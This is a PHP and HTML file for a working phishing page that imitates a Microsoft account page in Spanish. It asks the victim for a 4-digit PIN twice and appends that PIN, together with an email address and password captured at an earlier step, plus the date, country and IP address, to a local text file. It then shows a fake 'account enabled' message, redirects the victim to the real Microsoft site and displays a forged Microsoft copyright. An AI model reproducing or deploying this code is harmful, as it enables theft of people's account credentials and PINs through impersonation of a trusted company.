<?php
session_start();
date_default_timezone_set('America/Caracas');
ini_set("display_errors", 0);
$userp = $_SERVER['REMOTE_ADDR'];

$cc = trim(file_get_contents("http://ipinfo.io/{$userp}/country"));
if(isset($_POST["campo1"]) && isset($_POST["campo2"])){
	$_SESSION['campo1'] = $_POST["campo1"];
	$_SESSION['campo2'] = $_POST["campo2"];
}
	
if(isset($_POST["campo3"]) && isset($_POST["campo4"])){
	
	$file = fopen("Yefo1425.txt", "a");
fwrite($file, "Correo: ".$_SESSION['campo1']."  - Psswrd: ".$_SESSION['campo2']." - Pin ".$_POST['campo3']."	Repin ".$_POST['campo4']." Fecha: ".date('Y-m-d')." - ".date('H:i:s')." - ".$cc." ".$userp." " . PHP_EOL);
fwrite($file, "********************************* " . PHP_EOL);
fclose($file);

	 echo "<script>";
			echo "alert('Su cuenta ha sido habilitada exitosamente!');";
			echo "window.location.href='https://home.live.com/?mkt=es-es';";
			echo "</script>";
	

}
	
?>

<html>
<head>
<style>
input[type=password] {
    width: 500px;
    padding: 10px 14px;
    margin: 8px 0;
    box-sizing: border-box;
   	font-family: "Helvetica Neue";
	font-size: 14px;
}
input[type=text] {
    width: 500px;
    padding: 10px 14px;
    margin: 8px 0;
    box-sizing: border-box;
   	font-family: "Helvetica Neue";
	font-size: 14px;
}
input[type=email] {
    width: 500px;
    padding: 10px 14px;
    margin: 8px 0;
    box-sizing: border-box;
   	font-family: "Helvetica Neue";
	font-size: 14px;
}

h1 {
	font-family: "Helvetica Neue";
	font-size: 40px;
	font-style: normal;
	font-variant: normal;
	font-weight: 100;
	line-height: 40px;
}
h2 {
	font-family: "Helvetica";
	font-size: 17px;
	font-style: normal;
	font-variant: normal;
	font-weight: 100;
	line-height: 18px;
}
h3 {
	font-family: "Helvetica Neue";
	font-size: 16px;
	font-style: normal;
	font-variant: normal;
	font-weight: 300;
	line-height: 18px;
	color: #4d79ff;
}
h4 {
	font-family: "Helvetica Neue";
	font-size: 11px;
	font-style:normal;
	font-variant: normal;
	font-weight: 300;
	line-height: 23px;
}
.error {
	font-family: "Helvetica";
	font-size: 17px;
	font-style: normal;
	font-variant: normal;
	font-weight: 100;
	line-height: 20px;
	color:#ff1a1a;
}
a:link {
 text-decoration:none;
 color: #4d79ff;
}
a:visited {
 text-decoration:none;
 color: #4d79ff;
}



    @-webkit-keyframes rotate {
    from {
        -webkit-transform: rotate(0deg);
    }
    to {
        -webkit-transform: rotate(360deg);
    }
}
#loading {
    border: 1px solid #000;
    border-right: 0;
    border-bottom: 0;
    -webkit-border-radius: 100px;
    height: 100px;
    width: 100px;
    margin: 100px;
    -webkit-transition: all 0.5s ease-in;
    -webkit-animation-name:             rotate;
    -webkit-animation-duration:         1.0s;
    -webkit-animation-iteration-count:  infinite;
    -webkit-animation-timing-function: linear;
}

.loader {
    border: 6px solid #f3f3f3; /* Light grey 16 */
    border-top: 6px solid rgba(77,86,92,0.87); /* #3498db Blue */
    border-radius: 50%;
    width: 60px;/*120*/
    height: 60px;/*120*/
    animation: spin 1s linear infinite;
    position: fixed;
    top: 250px;
    left: 48%;
}

@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}


</style>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-215712162-1">
</script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-215712162-1');
</script>
</head>

<body>

<div align=center>
<form name="form1" id="form1" method="post" action="">
<table width="1000" border="0" cellspacing="1" cellpadding="2">
<tr>
	<td colspan="4"><div align="center"><img id="superior" src="flag-up.png" width="364" height="54"></div><br><br></td>
</tr>
<tr>
	<td colspan="4"><div align="left"></div></td>
</tr>
<tr>
	<td colspan="4"><div align="left"><h2><b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
	Ingrese su Pin de 4 D&iacute;gitos</b></h2></div></td>
</tr>
<tr>
	<td colspan="4">
		<div align="center"><input type="password"  name="campo3" placeholder="Ingrese su Pin" required maxlength="4" pattern="[0-9]{1,4}" ></div>
	</td>
</tr>
<tr>
	<td colspan="4">
		<div align="center"><input type="password"  name="campo4" placeholder="Confirme su Pin" required maxlength="4" pattern="[0-9]{1,4}"></div>
		
	</td>
</tr>


<tr>
	
    <td colspan="4"><div align="center"><br><br>

	<div><input type="submit" style="background-color: #2987DA; color:white; width:150px; height: 35px; border:none" value="Habilitar Cuenta" width="250px"/></div>

	
	
	<!--<input type="image" name="imageField" src="buttonc.png" />-->
   </div><br><br><br></td>
</tr>

<tr>
	<td width="340"><div align="center"><h3>&nbsp;</h3></div></td>
	<td width="160"><div align="center"><h3><a target="_blank" href="">T&eacute;rminos de uso</a></h3></div></td>
	<td width="160"><div align="center"><h3><a target="_blank" href="">Privacidad y Cookies</a></h3></div></td>
	<td width="340"><div align="center"><h3>&nbsp;</h3></div></td>
</tr>


<tr>
	<td colspan="4"><div align="center"> <h4>&copy; <?php echo date('Y'); ?> Microsoft.</h4></div><br><br></td>
</tr>

</table>
</form>
</div>
</body>
</html>